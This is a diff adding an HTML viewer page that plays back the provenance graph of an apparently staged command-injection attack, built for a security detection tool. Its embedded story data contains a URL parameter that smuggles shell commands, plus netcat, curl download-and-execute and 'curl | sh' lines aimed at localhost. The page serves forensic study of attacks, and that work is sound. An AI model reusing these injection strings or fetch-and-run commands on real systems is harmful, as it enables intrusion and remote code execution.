@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>Attack Path Storybook</title>
+<!-- SPDX-License-Identifier: MIT
+     The page of p15.graph.viewer: the attack path of p15.graph.story, played edge by edge.
+     Self-contained and offline: no fonts, scripts or images are fetched. The story document is
+     embedded below by p15.graph.viewer.render (format p15.story/1), or opened from a file. -->
+<style>
+/* Layout: a logic-analyser trace. Columns are chapters in time order; three lanes run across
+   them: network above the process line, files below. A chapter rail on the left, the timeline
+   with its alert flags at the bottom. */
+:root {
+  --bg: #eef1f4;       /* ground, cool grey biased to the process blue */
+  --panel: #ffffff;
+  --ink: #17212c;
+  --ink-2: #566273;
+  --line: #d3d9e1;
+  --lane: #e4e9ef;
+  --proc: #2b59c3;     /* processes */
+  --file: #9a6211;     /* files and pipes */
+  --sock: #0d7b6a;     /* sockets */
+  --alert: #c42d29;
+  --hot: #7a3de0;      /* the edge being told right now */
+  --proc-bg: #e3eafb;
+  --file-bg: #f7ecda;
+  --sock-bg: #ddf1ec;
+  --alert-bg: #fbe5e3;
+  --f-ui: "IBM Plex Sans", "Segoe UI", "Helvetica Neue", system-ui, sans-serif;
+  --f-display: "IBM Plex Sans Condensed", "Roboto Condensed", "Arial Narrow", "Segoe UI", system-ui, sans-serif;
+  --f-code: "JetBrains Mono", "Cascadia Mono", "SFMono-Regular", Consolas, "Liberation Mono", ui-monospace, monospace;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0e141b; --panel: #151d27; --ink: #e3e9f0; --ink-2: #93a0b0; --line: #273343; --lane: #121a23;
+    --proc: #86a8ff; --file: #e2ad55; --sock: #47c9a9; --alert: #ff6f61; --hot: #b591ff;
+    --proc-bg: #1b2a4a; --file-bg: #3a2c14; --sock-bg: #123a33; --alert-bg: #4a1d1b;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0e141b; --panel: #151d27; --ink: #e3e9f0; --ink-2: #93a0b0; --line: #273343; --lane: #121a23;
+  --proc: #86a8ff; --file: #e2ad55; --sock: #47c9a9; --alert: #ff6f61; --hot: #b591ff;
+  --proc-bg: #1b2a4a; --file-bg: #3a2c14; --sock-bg: #123a33; --alert-bg: #4a1d1b;
+  color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+[hidden] { display: none !important; }
+html, body { height: 100%; }
+body {
+  margin: 0; background: var(--bg); color: var(--ink); font: 14px/1.45 var(--f-ui);
+  display: grid; grid-template-rows: auto 1fr auto; overflow: hidden;
+}
+button, select, input { font: inherit; color: inherit; }
+button { cursor: pointer; }
+:focus-visible { outline: 2px solid var(--hot); outline-offset: 2px; }
+code, .mono { font-family: var(--f-code); font-size: .86em; }
+
+/* header */
+header.top {
+  display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 6px 24px; align-items: start;
+  padding-block: 14px 12px;
+  padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px));
+  border-bottom: 1px solid var(--line); background: var(--panel);
+}
+.top h1 { margin: 0; font: 600 1.35rem/1.15 var(--f-display); letter-spacing: .005em; text-wrap: balance; }
+.top .cmd {
+  margin: 6px 0 0; font-family: var(--f-code); font-size: .82rem; color: var(--ink-2);
+  overflow-wrap: anywhere; max-width: 110ch;
+}
+.top .cmd b { color: var(--alert); font-weight: 600; }
+.stats { display: flex; flex-wrap: wrap; gap: 4px 18px; margin-top: 8px; color: var(--ink-2); font-size: .85rem; }
+.stats strong { color: var(--ink); font-variant-numeric: tabular-nums; font-weight: 600; }
+.tools { display: flex; gap: 6px; flex-wrap: wrap; justify-content: flex-end; }
+.btn {
+  border: 1px solid var(--line); background: var(--panel); border-radius: 6px; padding: 5px 10px;
+  font-size: .85rem; line-height: 1.3; white-space: nowrap;
+}
+.btn:hover { border-color: var(--ink-2); }
+.btn[aria-pressed="true"] { background: var(--ink); color: var(--panel); border-color: var(--ink); }
+
+/* main */
+main { display: grid; grid-template-columns: 300px minmax(0, 1fr); min-height: 0; }
+nav.rail { border-right: 1px solid var(--line); overflow: auto; background: var(--panel); min-height: 0; }
+.rail h2 {
+  margin: 0; padding: 14px 16px 6px; font: 600 .8rem/1.2 var(--f-display); color: var(--ink-2); letter-spacing: .04em;
+}
+.rail ol { list-style: none; margin: 0; padding: 0 8px 12px; counter-reset: ch; }
+.rail li button {
+  display: grid; grid-template-columns: 26px minmax(0, 1fr); gap: 2px 8px; width: 100%; text-align: left;
+  background: none; border: 0; border-radius: 6px; padding: 8px; position: relative;
+}
+.rail li button:hover { background: var(--lane); }
+.rail li button[aria-current="step"] { background: var(--proc-bg); }
+.rail .num {
+  grid-row: span 3; font: 600 1.05rem/1.2 var(--f-display); color: var(--ink-2); font-variant-numeric: tabular-nums;
+}
+.rail li button[aria-current="step"] .num { color: var(--proc); }
+.rail .ttl { font: 600 .95rem/1.25 var(--f-display); }
+.rail .ttl code { font-size: .8rem; font-weight: 500; overflow-wrap: anywhere; }
+.rail .meta { color: var(--ink-2); font-size: .78rem; font-variant-numeric: tabular-nums; }
+.rail .chips { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 3px; }
+.chip-r {
+  font: 600 .7rem/1 var(--f-code); padding: 3px 5px; border-radius: 3px; background: var(--alert-bg); color: var(--alert);
+}
+.rail .done .num::after { content: ""; }
+.rail .foot { padding: 4px 16px 16px; color: var(--ink-2); font-size: .8rem; }
+
+section.stage { position: relative; overflow: hidden; min-height: 0; background: var(--bg); touch-action: none; }
+section.stage svg { width: 100%; height: 100%; display: block; cursor: grab; user-select: none; }
+section.stage svg.dragging { cursor: grabbing; }
+#world { transition: transform .7s cubic-bezier(.3, .7, .2, 1); }
+#world.nomove { transition: none; }
+
+/* graph marks */
+.lane-bg { fill: var(--lane); }
+.lane-name { fill: var(--ink-2); font: 600 13px var(--f-display); letter-spacing: .06em; }
+.col-head { fill: var(--ink-2); font: 600 12px var(--f-display); }
+.col-head .n { fill: var(--ink); font-size: 15px; }
+.col-rule { stroke: var(--line); stroke-dasharray: 2 4; }
+.node { opacity: 0; transition: opacity .35s; cursor: pointer; }
+.node .box { transform-box: fill-box; transform-origin: center; transform: scale(.85); transition: transform .35s; }
+.node.show { opacity: 1; }
+.node.show .box { transform: none; }
+.node.ghost { opacity: .13; }
+.node rect.b { stroke-width: 1.4; }
+.node.k-proc rect.b { fill: var(--proc-bg); stroke: var(--proc); }
+.node.k-file rect.b { fill: var(--file-bg); stroke: var(--file); }
+.node.k-sock rect.b { fill: var(--sock-bg); stroke: var(--sock); }
+.node.prog rect.b { stroke-dasharray: 4 3; }
+.node text { font: 12px var(--f-code); fill: var(--ink); pointer-events: none; }
+.node text .pid { font-weight: 700; }
+.node.k-proc text .pid { fill: var(--proc); }
+.node.hot rect.b { stroke: var(--hot); stroke-width: 2.6; }
+.node.sel rect.b { stroke-width: 3; }
+.node.start rect.b { stroke-width: 2.6; }
+.node .ring { fill: none; stroke: var(--alert); stroke-width: 2; opacity: 0; }
+.node.alerted .ring { opacity: 1; }
+.node .tag rect { fill: var(--alert); }
+.node .tag text { fill: var(--panel); font: 700 10px var(--f-code); }
+.node .tag { opacity: 0; transition: opacity .3s; }
+.node.alerted .tag { opacity: 1; }
+.link { fill: none; opacity: 0; transition: opacity .35s, stroke .35s; stroke-linecap: round; }
+.link.show { opacity: .75; }
+.link.ghost { opacity: .08; }
+.link.c-ctl { stroke: var(--ink-2); }
+.link.c-file { stroke: var(--file); }
+.link.c-sock { stroke: var(--sock); }
+.link.c-pair { stroke: var(--sock); stroke-dasharray: 1 5; }
+.link.hot { stroke: var(--hot); opacity: 1; }
+.link.hot.draw { stroke-dasharray: var(--len); animation: draw .8s ease-out forwards; }
+.link.c-pair.hot { stroke-dasharray: 1 5; animation: none; }
+@keyframes draw { from { stroke-dashoffset: var(--len); } to { stroke-dashoffset: 0; } }
+.hit { fill: none; stroke: transparent; stroke-width: 12; cursor: pointer; }
+.hit.off { display: none; }
+.elabel { font: 600 11px var(--f-code); fill: var(--hot); paint-order: stroke; stroke: var(--bg); stroke-width: 5px; stroke-linejoin: round; pointer-events: none; }
+marker path { stroke: none; }
+.m-ctl { fill: var(--ink-2); } .m-file { fill: var(--file); } .m-sock { fill: var(--sock); } .m-hot { fill: var(--hot); }
+
+/* the caption: what this step is */
+.caption {
+  position: absolute; left: 16px; bottom: 16px; right: 16px; max-width: 760px;
+  background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 10px 14px;
+  box-shadow: 0 6px 24px -12px rgba(15, 25, 40, .35); pointer-events: none;
+}
+.caption .when { font: 600 .78rem var(--f-code); color: var(--hot); font-variant-numeric: tabular-nums; }
+.caption .say { font: 500 1.08rem/1.35 var(--f-display); margin-top: 2px; overflow-wrap: anywhere; }
+.caption .say code { font-size: .86em; }
+.caption .ctx { color: var(--ink-2); font-size: .8rem; margin-top: 2px; }
+
+.toast {
+  position: absolute; top: 14px; right: 14px; width: min(420px, calc(100% - 28px));
+  background: var(--panel); border: 1px solid var(--alert); border-left-width: 5px; border-radius: 8px;
+  padding: 10px 14px; box-shadow: 0 10px 30px -14px rgba(120, 20, 20, .5);
+  transform: translateY(-8px); opacity: 0; transition: opacity .3s, transform .3s; pointer-events: none;
+}
+.toast.on { opacity: 1; transform: none; }
+.toast .r { font: 700 .8rem var(--f-code); color: var(--alert); }
+.toast .d { margin-top: 3px; font-size: .9rem; overflow-wrap: anywhere; }
+.toast .w { margin-top: 4px; color: var(--ink-2); font-size: .78rem; }
+
+.mini { position: absolute; top: 14px; left: 14px; display: flex; gap: 6px; flex-wrap: wrap; }
+
+aside.detail {
+  position: absolute; top: 0; right: 0; bottom: 0; width: min(380px, 100%); background: var(--panel);
+  border-left: 1px solid var(--line); overflow: auto; padding: 16px; box-shadow: -10px 0 30px -20px rgba(0, 0, 0, .4);
+}
+.detail h3 { margin: 0 0 4px; font: 600 1.1rem/1.25 var(--f-display); overflow-wrap: anywhere; padding-right: 36px; }
+.detail .close { position: absolute; top: 12px; right: 12px; }
+.detail .kind { font: 600 .75rem var(--f-code); padding: 2px 6px; border-radius: 3px; display: inline-block; }
+.kind.k-proc { background: var(--proc-bg); color: var(--proc); }
+.kind.k-file { background: var(--file-bg); color: var(--file); }
+.kind.k-sock { background: var(--sock-bg); color: var(--sock); }
+.detail pre {
+  white-space: pre-wrap; overflow-wrap: anywhere; background: var(--lane); padding: 8px 10px; border-radius: 6px;
+  font: .78rem/1.45 var(--f-code); margin: 8px 0;
+}
+.detail h4 { margin: 14px 0 6px; font: 600 .8rem var(--f-display); color: var(--ink-2); letter-spacing: .04em; }
+.detail ul { list-style: none; margin: 0; padding: 0; }
+.detail li button {
+  display: grid; grid-template-columns: 72px 74px minmax(0, 1fr); gap: 6px; width: 100%; text-align: left;
+  background: none; border: 0; border-bottom: 1px solid var(--line); padding: 5px 2px; font-size: .8rem;
+}
+.detail li button:hover { background: var(--lane); }
+.detail .t { font: .75rem var(--f-code); color: var(--ink-2); font-variant-numeric: tabular-nums; }
+.detail .op { font: 600 .72rem var(--f-code); }
+.detail .other { overflow-wrap: anywhere; font-family: var(--f-code); font-size: .76rem; }
+.detail .al { background: var(--alert-bg); border-radius: 6px; padding: 6px 9px; margin: 6px 0; font-size: .83rem; }
+.detail .al b { color: var(--alert); font-family: var(--f-code); }
+
+/* the end card */
+.endcard {
+  position: absolute; inset: 0; display: grid; place-items: center; padding: 16px;
+  background: color-mix(in srgb, var(--bg) 82%, transparent); backdrop-filter: blur(2px);
+}
+.endcard .card {
+  background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 22px 24px;
+  width: min(640px, 100%); max-height: 100%; overflow: auto; box-shadow: 0 20px 50px -25px rgba(0, 0, 0, .45);
+}
+.endcard h2 { margin: 0 0 10px; font: 600 1.35rem/1.2 var(--f-display); text-wrap: balance; }
+.endcard p { margin: 8px 0; max-width: 65ch; }
+.endcard .big { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin: 14px 0; }
+.endcard .big div { border-top: 3px solid var(--line); padding-top: 6px; }
+.endcard .big strong { display: block; font: 600 1.7rem/1.1 var(--f-display); font-variant-numeric: tabular-nums; }
+.endcard .big span { color: var(--ink-2); font-size: .8rem; }
+.endcard .big .a { border-color: var(--alert); } .endcard .big .a strong { color: var(--alert); }
+.endcard ul { margin: 6px 0; padding-left: 18px; }
+.endcard li { margin: 3px 0; }
+.endcard .row { display: flex; gap: 8px; justify-content: flex-end; margin-top: 14px; flex-wrap: wrap; }
+
+/* transport and timeline */
+footer.transport {
+  display: grid; grid-template-columns: auto minmax(0, 1fr) auto; gap: 14px; align-items: center;
+  padding-block: 10px calc(10px + env(safe-area-inset-bottom, 0px));
+  padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px));
+  border-top: 1px solid var(--line); background: var(--panel);
+}
+.keys { display: flex; gap: 4px; align-items: center; }
+.keys .btn { min-width: 36px; padding: 6px 8px; }
+.keys .play { min-width: 82px; font-weight: 600; background: var(--ink); color: var(--panel); border-color: var(--ink); }
+.track { position: relative; height: 62px; cursor: pointer; touch-action: none; }
+.track .bands { position: absolute; left: 0; right: 0; top: 16px; height: 30px; }
+.track .band {
+  position: absolute; top: 0; bottom: 0; border-left: 1px solid var(--line); background: var(--lane);
+  font: 600 10px/1 var(--f-display); color: var(--ink-2); padding: 19px 0 0 4px; overflow: hidden; white-space: nowrap;
+}
+.track .band.cur { background: var(--proc-bg); color: var(--proc); }
+.track .tick { position: absolute; top: 18px; width: 2px; height: 13px; margin-left: -1px; border-radius: 1px; opacity: .85; }
+.tick.c-ctl { background: var(--ink-2); } .tick.c-file { background: var(--file); } .tick.c-sock, .tick.c-pair { background: var(--sock); }
+.track .flag {
+  position: absolute; top: 0; transform: translateX(-50%); font: 700 9px/1 var(--f-code); color: var(--panel);
+  background: var(--alert); padding: 3px 3px; border-radius: 2px; white-space: nowrap;
+}
+.track .flag::after {
+  content: ""; position: absolute; left: 50%; top: 100%; width: 1px; height: 10px; background: var(--alert);
+}
+.track .head { position: absolute; top: 14px; bottom: 14px; width: 3px; margin-left: -1.5px; background: var(--hot); border-radius: 2px; transition: left .25s; }
+.track .scale { position: absolute; left: 0; right: 0; bottom: 0; display: flex; justify-content: space-between; font: 10px var(--f-code); color: var(--ink-2); font-variant-numeric: tabular-nums; }
+.readout { text-align: right; font-variant-numeric: tabular-nums; }
+.readout .t { font: 600 1.05rem var(--f-code); color: var(--hot); }
+.readout .i { color: var(--ink-2); font-size: .78rem; }
+.readout select { margin-left: 6px; border: 1px solid var(--line); background: var(--panel); border-radius: 4px; font-size: .78rem; }
+
+dialog {
+  border: 1px solid var(--line); border-radius: 10px; background: var(--panel); color: var(--ink);
+  width: min(720px, calc(100% - 32px)); padding: 20px 22px; max-height: calc(100% - 40px);
+}
+dialog::backdrop { background: rgba(10, 16, 24, .45); }
+dialog h2 { margin: 0 0 8px; font: 600 1.25rem var(--f-display); }
+dialog h3 { margin: 16px 0 6px; font: 600 .95rem var(--f-display); }
+dialog p, dialog li { max-width: 68ch; }
+dialog table { border-collapse: collapse; width: 100%; font-size: .85rem; }
+dialog td { border-bottom: 1px solid var(--line); padding: 5px 6px; vertical-align: top; }
+dialog td:first-child { font: 600 .8rem var(--f-code); white-space: nowrap; }
+.sw { display: inline-block; width: 26px; height: 12px; border-radius: 3px; vertical-align: -1px; margin-right: 6px; border: 1.5px solid; }
+.sw.proc { background: var(--proc-bg); border-color: var(--proc); }
+.sw.file { background: var(--file-bg); border-color: var(--file); }
+.sw.prog { background: var(--file-bg); border-color: var(--file); border-style: dashed; }
+.sw.sock { background: var(--sock-bg); border-color: var(--sock); }
+.src { font-size: .8rem; color: var(--ink-2); }
+.src pre { white-space: pre-wrap; overflow-wrap: anywhere; font: .75rem/1.4 var(--f-code); background: var(--lane); padding: 8px; border-radius: 6px; }
+.drop { position: fixed; inset: 0; display: grid; place-items: center; background: color-mix(in srgb, var(--hot) 18%, transparent); font: 600 1.4rem var(--f-display); pointer-events: none; }
+.err { color: var(--alert); font-weight: 600; }
+
+@media (max-width: 860px) {
+  body { overflow: auto; display: block; }
+  header.top { grid-template-columns: minmax(0, 1fr); }
+  .tools { justify-content: flex-start; }
+  main { display: flex; flex-direction: column; }
+  section.stage { height: 64vh; order: 1; }
+  nav.rail { order: 3; border-right: 0; border-top: 1px solid var(--line); }
+  footer.transport { grid-template-columns: minmax(0, 1fr); gap: 8px; }
+  .readout { text-align: left; }
+  .caption { left: 10px; right: 10px; bottom: 10px; }
+  .caption .say { font-size: .95rem; }
+  .endcard .big { grid-template-columns: minmax(0, 1fr); }
+}
+@media (prefers-reduced-motion: reduce) {
+  #world, .node, .node .box, .link, .toast, .track .head { transition: none !important; }
+  .link.hot.draw { animation: none; stroke-dasharray: none; }
+}
+</style>
+</head>
+<body>
+<header class="top">
+  <div style="min-width:0">
+    <h1 id="title">Attack path</h1>
+    <p class="cmd" id="startcmd"></p>
+    <div class="stats" id="stats"></div>
+  </div>
+  <div class="tools">
+    <button class="btn" id="b-legend" type="button">How to read this</button>
+    <button class="btn" id="b-source" type="button">Source</button>
+    <button class="btn" id="b-open" type="button">Open a story file</button>
+    <input type="file" id="file" accept=".json,application/json" hidden>
+    <button class="btn" id="b-theme" type="button" aria-label="Switch light or dark">Light / dark</button>
+  </div>
+</header>
+<main>
+  <nav class="rail" aria-label="Chapters">
+    <h2>Chapters</h2>
+    <ol id="chapters"></ol>
+    <div class="foot" id="railfoot"></div>
+  </nav>
+  <section class="stage" id="stage" aria-label="The attack graph">
+    <svg id="svg" role="img" aria-labelledby="title">
+      <defs id="defs"></defs>
+      <g id="world"><g id="g-lanes"></g><g id="g-links"></g><g id="g-hits"></g><g id="g-nodes"></g><text id="elabel" class="elabel"></text></g>
+    </svg>
+    <div class="mini">
+      <button class="btn" id="b-follow" type="button" aria-pressed="true" title="Keep the camera on the step being told (F)">Follow</button>
+      <button class="btn" id="b-fit" type="button" title="Show the whole graph (O)">Whole graph</button>
+      <button class="btn" id="b-ghost" type="button" aria-pressed="false" title="Show what is still to come, faintly (G)">Show what comes next</button>
+    </div>
+    <div class="caption" id="caption" aria-live="polite"></div>
+    <div class="toast" id="toast" role="status"></div>
+    <aside class="detail" id="detail" hidden></aside>
+    <div class="endcard" id="endcard" hidden></div>
+  </section>
+</main>
+<footer class="transport">
+  <div class="keys">
+    <button class="btn" id="b-prevch" type="button" title="Previous chapter (Page Up)" aria-label="Previous chapter">&#x23EE;</button>
+    <button class="btn" id="b-prev" type="button" title="Previous step (Left arrow)" aria-label="Previous step">&#x25C0;</button>
+    <button class="btn play" id="b-play" type="button" title="Play or pause (Space)">Play</button>
+    <button class="btn" id="b-next" type="button" title="Next step (Right arrow)" aria-label="Next step">&#x25B6;</button>
+    <button class="btn" id="b-nextch" type="button" title="Next chapter (Page Down)" aria-label="Next chapter">&#x23ED;</button>
+  </div>
+  <div class="track" id="track" role="slider" tabindex="0" aria-label="Step in the story" aria-valuemin="1">
+    <div class="bands" id="bands"></div><div id="ticks"></div><div id="flags"></div><div class="head" id="head"></div>
+    <div class="scale"><span id="t-lo"></span><span id="t-hi"></span></div>
+  </div>
+  <div class="readout"><div class="t" id="r-t">&nbsp;</div><div class="i"><span id="r-i"></span>
+    <label><span hidden>Speed</span><select id="speed" aria-label="Playback speed"><option value="0.5">0.5×</option><option value="1" selected>1×</option><option value="2">2×</option><option value="4">4×</option></select></label></div></div>
+</footer>
+
+<dialog id="legend" aria-labelledby="lg-h">
+  <h2 id="lg-h">How to read this</h2>
+  <p>Each box is a node of the provenance graph that p15d's capture built; each line is an edge, drawn in the order it happened. Columns are chapters in time order. Lanes keep the kinds apart: sockets above the process line, files below.</p>
+  <h3>Nodes</h3>
+  <table>
+    <tr><td><span class="sw proc"></span>process</td><td>A process, named by its TGID and its comm. In brackets: argv[0] when it differs from the comm (a program run from <code>/proc/self/fd/3</code> has the comm <code>3</code>). A red ring and a tag mark a node an alert names.</td></tr>
+    <tr><td><span class="sw file"></span>file</td><td>A file by its path, or by its identity key (<code>o:NNNN</code>) when it has none, such as a pipe.</td></tr>
+    <tr><td><span class="sw prog"></span>program</td><td>A file whose only part in the story is that a process ran it.</td></tr>
+    <tr><td><span class="sw sock"></span>socket</td><td>One end of a connection, as local address and port → remote address and port.</td></tr>
+  </table>
+  <h3>Edges</h3>
+  <table>
+    <tr><td>CLONE</td><td>a process forked a child (parent → child)</td></tr>
+    <tr><td>EXECUTE</td><td>a process ran a program file (file → process)</td></tr>
+    <tr><td>OPEN</td><td>a process opened a file</td></tr>
+    <tr><td>READ / WRITE</td><td>bytes read from or written to a file or a pipe; the line is thicker for more bytes</td></tr>
+    <tr><td>CONNECT / ACCEPT</td><td>a process connected a socket; a listening process accepted a connection</td></tr>
+    <tr><td>SEND / RECV</td><td>bytes sent or received on a socket</td></tr>
+    <tr><td>TCP (dotted)</td><td>two sockets that are the two ends of one TCP connection, joined by sequence number</td></tr>
+  </table>
+  <p>Repeated transfers between the same two nodes are one line, with their count (×N) and bytes.</p>
+  <h3>Chapters</h3>
+  <p>The first chapter is how the start was reached: from the start, the most recent cause of each step, back in time (the cause chain). Then the start itself, then one chapter for each command it ran (each child it forked; children forked within 2 ms, such as the two ends of a pipe, share one). Last, what happened after its commands, if anything.</p>
+  <h3>What the page decides</h3>
+  <p>Nothing. Every node, edge, time and alert is p15.graph.story's output for this run. The walks are BackTracker's rule over time-stamped edges; the alerts are the four rules of p15.graph.rules, which are patterns, not verdicts. This page only lays them out and plays them.</p>
+  <h3>Keys</h3>
+  <p><code>←</code> <code>→</code> step, <code>Space</code> play or pause, <code>Page Up</code> <code>Page Down</code> chapter, <code>Home</code> <code>End</code>, <code>O</code> whole graph, <code>F</code> follow, <code>G</code> what comes next, <code>Esc</code> close.</p>
+  <form method="dialog"><div style="text-align:right"><button class="btn">Close</button></div></form>
+</dialog>
+<dialog id="source" aria-labelledby="src-h">
+  <h2 id="src-h">Where this comes from</h2>
+  <div class="src" id="srcbody"></div>
+  <form method="dialog"><div style="text-align:right"><button class="btn">Close</button></div></form>
+</dialog>
+
+<script type="application/json" id="story-data">{"schema":"p15.story/1","start":"proc 7352 sh","counts":{"shown":41,"reached":210,"hidden_noise":0,"hidden_old":169},"ancestors":["sudo(7253)","sudo(7251)","bash(7239)","bash(1338)","sshd-session(1337)","sshd-session(1232)","sshd(1229)","systemd(1)"],"nodes":[{"id":"proc 7352 sh","kind":"proc","label":"proc 7352 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 \u003c/dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)","short":"proc 7352 sh","cmd":"/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 \u003c/dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh"},{"id":"proc 7320 python","kind":"proc","label":"proc 7320 python (/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080)","short":"proc 7320 python","cmd":"/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080"},{"id":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084","kind":"sock","label":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084","short":"sock 127.0.0.1:8080 -\u003e 127.0.0.1:57084","cmd":null},{"id":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","kind":"sock","label":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","short":"sock 127.0.0.1:57084 -\u003e 127.0.0.1:8080","cmd":null},{"id":"proc 7351 curl","kind":"proc","label":"proc 7351 curl (curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh)","short":"proc 7351 curl","cmd":"curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh"},{"id":"proc 7254 bash","kind":"proc","label":"proc 7254 bash (bash tools/demo/run_demo.sh /var/tmp/p15-demo)","short":"proc 7254 bash","cmd":"bash tools/demo/run_demo.sh /var/tmp/p15-demo"},{"id":"file o:2222","kind":"file","label":"file o:2222","short":"file o:2222","cmd":null},{"id":"file /usr/bin/dash","kind":"file","label":"file /usr/bin/dash","short":"file /usr/bin/dash","cmd":null},{"id":"proc 7353 getent","kind":"proc","label":"proc 7353 getent (getent hosts localhost)","short":"proc 7353 getent","cmd":"getent hosts localhost"},{"id":"file /usr/bin/getent","kind":"file","label":"file /usr/bin/getent","short":"file /usr/bin/getent","cmd":null},{"id":"sock 127.0.0.1:40718 -\u003e 127.0.0.53:53","kind":"sock","label":"sock 127.0.0.1:40718 -\u003e 127.0.0.53:53","short":"sock 127.0.0.1:40718 -\u003e 127.0.0.53:53","cmd":null},{"id":"file o:2286","kind":"file","label":"file o:2286","short":"file o:2286","cmd":null},{"id":"proc 7354 nc","kind":"proc","label":"proc 7354 nc (nc -w1 127.0.0.1 4444)","short":"proc 7354 nc","cmd":"nc -w1 127.0.0.1 4444"},{"id":"file /usr/bin/nc.openbsd","kind":"file","label":"file /usr/bin/nc.openbsd","short":"file /usr/bin/nc.openbsd","cmd":null},{"id":"sock 127.0.0.1:57868 -\u003e 127.0.0.1:4444","kind":"sock","label":"sock 127.0.0.1:57868 -\u003e 127.0.0.1:4444","short":"sock 127.0.0.1:57868 -\u003e 127.0.0.1:4444","cmd":null},{"id":"sock 127.0.0.1:4444 -\u003e 127.0.0.1:57868","kind":"sock","label":"sock 127.0.0.1:4444 -\u003e 127.0.0.1:57868","short":"sock 127.0.0.1:4444 -\u003e 127.0.0.1:57868","cmd":null},{"id":"proc 7316 nc","kind":"proc","label":"proc 7316 nc (nc -l 127.0.0.1 4444)","short":"proc 7316 nc","cmd":"nc -l 127.0.0.1 4444"},{"id":"proc 7355 curl","kind":"proc","label":"proc 7355 curl (curl -s http://127.0.0.1:8000/k -o /tmp/.k)","short":"proc 7355 curl","cmd":"curl -s http://127.0.0.1:8000/k -o /tmp/.k"},{"id":"file /usr/bin/curl","kind":"file","label":"file /usr/bin/curl","short":"file /usr/bin/curl","cmd":null},{"id":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","kind":"sock","label":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","short":"sock 127.0.0.1:46508 -\u003e 127.0.0.1:8000","cmd":null},{"id":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508","kind":"sock","label":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508","short":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46508","cmd":null},{"id":"proc 7327 python","kind":"proc","label":"proc 7327 python (/home/ashu/p15venv/bin/python -m http.server 8000 --bind 127.0.0.1 --directory /var/tmp/p15-demo/stager)","short":"proc 7327 python","cmd":"/home/ashu/p15venv/bin/python -m http.server 8000 --bind 127.0.0.1 --directory /var/tmp/p15-demo/stager"},{"id":"file /var/tmp/p15-demo/stager.log","kind":"file","label":"file /var/tmp/p15-demo/stager.log","short":"file /var/tmp/p15-demo/stager.log","cmd":null},{"id":"file /tmp/.k","kind":"file","label":"file /tmp/.k","short":"file /tmp/.k","cmd":null},{"id":"proc 7357 chmod","kind":"proc","label":"proc 7357 chmod (chmod +x /tmp/.k)","short":"proc 7357 chmod","cmd":"chmod +x /tmp/.k"},{"id":"file /usr/lib/cargo/bin/coreutils/tee","kind":"file","label":"file /usr/lib/cargo/bin/coreutils/tee","short":"file /usr/lib/cargo/bin/coreutils/tee","cmd":null},{"id":"proc 7358 .k","kind":"proc","label":"proc 7358 .k (/tmp/.k)","short":"proc 7358 .k","cmd":"/tmp/.k"},{"id":"file o:2377","kind":"file","label":"file o:2377","short":"file o:2377","cmd":null},{"id":"proc 7359 curl","kind":"proc","label":"proc 7359 curl (curl -s http://127.0.0.1:8000/s2)","short":"proc 7359 curl","cmd":"curl -s http://127.0.0.1:8000/s2"},{"id":"proc 7360 sh","kind":"proc","label":"proc 7360 sh (sh)","short":"proc 7360 sh","cmd":"sh"},{"id":"file o:2429","kind":"file","label":"file o:2429","short":"file o:2429","cmd":null},{"id":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","kind":"sock","label":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","short":"sock 127.0.0.1:46512 -\u003e 127.0.0.1:8000","cmd":null},{"id":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512","kind":"sock","label":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512","short":"sock 127.0.0.1:8000 -\u003e 127.0.0.1:46512","cmd":null},{"id":"file o:2432","kind":"file","label":"file o:2432","short":"file o:2432","cmd":null},{"id":"proc 7362 python3","kind":"proc","label":"proc 7362 python3 (python3 -)","short":"proc 7362 